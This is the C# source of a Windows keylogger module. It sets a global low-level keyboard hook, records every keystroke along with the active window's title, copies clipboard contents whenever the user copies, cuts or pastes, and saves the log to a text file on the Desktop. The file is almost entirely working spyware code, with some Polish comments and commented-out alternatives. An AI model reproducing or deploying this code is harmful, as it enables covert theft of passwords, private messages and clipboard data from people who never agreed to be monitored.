using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Windows;
using System.Timers;
using Keylogger3.Modules;
using System.Collections.Generic;


namespace Modules.Keylogger
{
    public sealed class Keylogger
    {
        internal static string path = Environment.GetEnvironmentVariable("USERPROFILE") + @"\Desktop\keylogs2.txt";
        private const int WmKeydown = 0x0100;
        private const int Whkeyboardll = 13;
        private static IntPtr _hookId = IntPtr.Zero;
        private static readonly LowLevelKeyboardProc Proc = HookCallback;
        public static bool KeyloggerEnabled = false;
        //public static string KeyLogs = "";
        private static string _prevActiveWindowTitle;
        public static readonly Thread MainThread = new Thread(StartKeylogger);
        public static string activeWind = "";
        private static bool isEnable = false;
        public static string clipboardText = "";
        public static readonly CountDownSave countDownSave = new CountDownSave();
       // internal static string altKey = "";
        internal static int specialCharacterX = 0;
        internal static int specialCharacterZ = 0;
        internal static int vkCode = 0;
        internal static bool altClicked = false;
        internal static bool ctrlClicked = false;
        internal static bool specialCharDelete = false;
        internal static StringBuilder sb = new StringBuilder();
        internal static List<int> specialCharId = new List<int> { 65, 67, 69, 76, 78, 79, 83, 88, 90 };
        internal static List<string> listOfSpecialChar = new List<string> { "ą", "ć", "ę", "ł", "ń", "ó", "ś", "ź", "ż" };

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Z;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSLLHOOKSTRUCT
        {
            public POINT pt;
            public UIntPtr dwExtraInfo;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true,
            CallingConvention = CallingConvention.Winapi)]
        private static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            [Out] [MarshalAs(UnmanagedType.LPWStr)]
            StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
        
        //function that starts the keylogger
        //blocks the creation of a new thread in case the function is run again
        public static void StartKeylogger()
        {
            if (!isEnable)
            {
                isEnable = true;
                countDownSave.Start();
                _hookId = SetHook(Proc);
                KeyloggerEnabled = true;
                WindowManager.IsEnabledSet(true);
                WindowManager.MainThread.Start();
                //todo
            }
        }

        public void StopKeylogger()
        {
            isEnable = false;
            KeyloggerEnabled = false;
            countDownSave.Stop();
            MainThread.Abort();
            WindowManager.IsEnabledSet(false);
            WindowManager.MainThread.Abort();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(Whkeyboardll, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }

        //head function of the keylogger
        internal static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (!KeyloggerEnabled)
            {
                return IntPtr.Zero;
            }

            MSLLHOOKSTRUCT mouseLowLevelHook = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));
            specialCharacterX = mouseLowLevelHook.pt.X;
            specialCharacterZ = mouseLowLevelHook.pt.Z;

            //Stopwatch stopWatch1 = new Stopwatch();
            //stopWatch1.Start();
            if ((specialCharacterX == 162 && specialCharacterZ == 541 ) || (altClicked && (specialCharacterX != 162 && specialCharacterZ !=541))) //nie działa ł i inne takie potem nie czyta znaków po wystąpieniu ł 
            {
                altClicked = true;
                switch (specialCharacterX.ToString())
                {
                    case "65":
                        //ą
                        vkCode = 65;
                        altClicked = false;
                        break;
                    case "67":
                        //ć
                        vkCode = 67;
                        altClicked = false;
                        break;
                    case "69":
                        //ę
                        vkCode = 69;
                        altClicked = false;
                        break;
                    case "76":
                        //ł
                        vkCode = 76;
                        altClicked = false;
                        break;
                    case "78":
                        //ń
                        vkCode = 78;
                        altClicked = false;
                        break;
                    case "79":
                        //ó
                        vkCode = 79;
                        altClicked = false;
                        break;
                    case "83":
                        //ś
                        vkCode = 83;
                        altClicked = false;
                        break;
                    case "88":
                        //ź
                        vkCode = 88;
                        altClicked = false;
                        break;
                    case "90":
                        //ż
                        vkCode = 90;
                        altClicked = false;
                        break;

                    default:
                        return CallNextHookEx(_hookId, nCode, wParam, lParam);
                }
            }

            if ((ctrlClicked && ((specialCharacterX == 67 && specialCharacterZ == 46) || (specialCharacterX == 88 && specialCharacterZ == 45))))
            { 
                //Thread.Yield();
                Thread.Sleep(500);
                sb.AppendLine();
                sb.AppendLine("===> ClipboardTxtCopy <===");
                sb.Append(Clipboard.GetText(TextDataFormat.Text));
                sb.AppendLine();
                sb.AppendLine("===> EndOfCopy <===");
                return CallNextHookEx(_hookId, nCode, wParam, lParam);
            }
            if ((ctrlClicked && (specialCharacterX == 86 && specialCharacterZ == 47)))
            {
                sb.AppendLine();
                sb.AppendLine("===> ClipboardTxtPaste <===");
                sb.Append(Clipboard.GetText(TextDataFormat.Text));
                sb.AppendLine();
                sb.AppendLine("===> EndOfPaste <===");
                ctrlClicked = false;
                return CallNextHookEx(_hookId, nCode, wParam, lParam);
            }
            if (specialCharacterX == 162 && specialCharacterZ == 29)
            {
                ctrlClicked = true;
                return CallNextHookEx(_hookId, nCode, wParam, lParam);
            }

                if (nCode < 0 || wParam != (IntPtr)WmKeydown)
                {
                    return CallNextHookEx(_hookId, nCode, wParam, lParam);
                }
                vkCode = Marshal.ReadInt32(lParam);
            
            
            //###########
            var capsLock = (GetKeyState(0x14) & 0xffff) != 0;
            var shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
            var currentKey = KeyboardLayout((uint)vkCode);

            if (capsLock || shiftPress)
            {
                currentKey = currentKey.ToUpper();
            }
            else
            {
                currentKey = currentKey.ToLower();
            }

            //checking special characters
            if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
            {
                currentKey = "[" + (Keys)vkCode + "]";
            }

            else
            {
                switch (((Keys)vkCode).ToString())
                {
                    case "Space":
                        currentKey = " ";
                        break;
                    case "Return":
                        currentKey = "[ENTER]";
                        break;
                    case "Escape":
                        currentKey = "[ESC]";
                        break;
                    case "LControlKey":
                        currentKey = "[CTRL]";
                        break;
                    case "RControlKey":
                        currentKey = "[CTRL]";
                        break;
                    //case "RShiftKey":
                    //    currentKey = "[Shift]";
                    //    break;
                    //case "LShiftKey":
                    //    currentKey = "[Shift]";
                    //    break;
                    case "Back":
                        currentKey = "[Back]";
                        break;
                    case "LWin":
                        currentKey = "[WIN]";
                        break;
                    case "Tab":
                        currentKey = "[Tab]";
                        break;
                    case "Capital":
                        currentKey = capsLock ? "[CAPSLOCK: OFF]" : "[CAPSLOCK: ON]";
                        break;
                }
            }

            //another switch to checking special keys and catch active window
            switch (currentKey)
            {
                //if enter, check if you have already saved the active window
                case "[ENTER]"

                when _prevActiveWindowTitle == WindowManager.ActiveWindow:
                    sb.Append(Environment.NewLine);
                    break;
                //if enter, but saving a new window
                case "[ENTER]":
                    _prevActiveWindowTitle = WindowManager.ActiveWindow;
                    sb.AppendLine();
                    sb.Append("### ");
                    sb.Append(_prevActiveWindowTitle);
                    sb.AppendLine(" ###");
                break;
                //if backspace
                case "[Back]" when sb.Length > 0:
                    sb.Length = sb.Length - 1;
                    break;
                //if another key
                default:
                    //check active window and save key
                    if (_prevActiveWindowTitle == WindowManager.ActiveWindow)
                    {
                        sb.Append(currentKey);
                    }
                    //saving active windows + key
                    else
                    {
                        _prevActiveWindowTitle = WindowManager.ActiveWindow;
                        sb.AppendLine();
                        sb.Append("### ");
                        sb.Append(_prevActiveWindowTitle);
                        sb.AppendLine(" ###");
                        sb.Append(currentKey);
                    }
                    break;
            }
            
            if (specialCharDelete)//usuwanie znaku jak wystąpi znak specjalny, bo do pliku sie wpisuje łl np. 
            {
            sb.Length = sb.Length - 1;
                specialCharDelete = false;
            }
            /*option 1*/
            switch (currentKey)
            {
                case "ą":
                    specialCharDelete = true;
                    break;
                case "ć":
                    specialCharDelete = true;
                    break;
                case "ę":
                    specialCharDelete = true;
                    break;
                case "ł":
                    specialCharDelete = true;
                    break;
                case "ń":
                    specialCharDelete = true;
                    break;
                case "ó":
                    specialCharDelete = true;
                    break;
                case "ś":
                    specialCharDelete = true;
                    break;
                case "ź":
                    specialCharDelete = true;
                    break;
                case "ż":
                    specialCharDelete = true;
                    break;
                default:
                    break;
            }

            /*option 2*/
            //foreach (string item in listOfSpecialChar)
            //{
            //    if (currentKey == item)
            //    {
            //        specialCharDelete = true;
            //        break;
            //    }
            //}

            /*option 3*/
            //for (int i = 0; i < listOfSpecialChar.Count; i++)
            //{
            //    if (currentKey == listOfSpecialChar[i])
            //    {
            //        specialCharDelete = true;
            //        break;
            //    }
            //}


            //stopWatch1.Stop();
            //KeyLogs += $"\n========> {stopWatch1.Elapsed}<========\n";
            vkCode = 0;
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                var sb = new StringBuilder();
                var vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer))
                {
                    return "";
                }
                var scanCode = MapVirtualKey(vkCode, 0);
                var keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(WindowManager.GetForegroundWindow(), out _));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch
            {
                //ignored
            }

            return ((Keys)vkCode).ToString();
        }
        //save catch characters into file 
        public static void SaveToFile()
        {
            File.WriteAllText(path, sb.ToString());
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);


        //implement
        //public sealed class Singleton
        //{
        //    private static Singleton instance = null;
        //    //singleton protection of multi-threading problems
        //    private static readonly object _lock = new object();

        //    private Singleton()
        //    {
        //    }

        //    public static Singleton Instance
        //    {
        //        get
        //        {
        //            if (instance == null)
        //            {
        //                lock (_lock)
        //                {
        //                    if (instance == null)
        //                    {
        //                        instance = new Singleton();
        //                    }
        //                }
        //            }
        //            return instance;
        //        }
        //    }
        //}
    }
}